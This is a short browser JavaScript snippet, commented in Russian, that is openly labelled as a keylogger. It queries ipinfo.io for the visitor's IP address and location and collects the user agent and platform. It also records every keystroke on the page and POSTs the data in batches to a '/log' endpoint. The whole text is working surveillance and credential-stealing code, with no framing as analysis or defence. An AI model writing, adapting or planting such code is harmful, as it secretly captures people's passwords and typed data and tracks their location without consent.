// Собираем IP и инфо
fetch('https://ipinfo.io/json')
  .then(res => res.json())
  .then(ipData => {
    const info = {
      type: 'info',
      ip: ipData.ip,
      loc: ipData.loc,
      ua: navigator.userAgent,
      platform: navigator.platform
    };
    fetch('/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(info)
    });
  });

// Кейлоггер
let keys = '';
document.addEventListener('keydown', (e) => {
  keys += e.key;
  if (keys.length >= 10) {
    fetch('/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type: 'keys', keys: keys })
    });
    keys = '';
  }
});
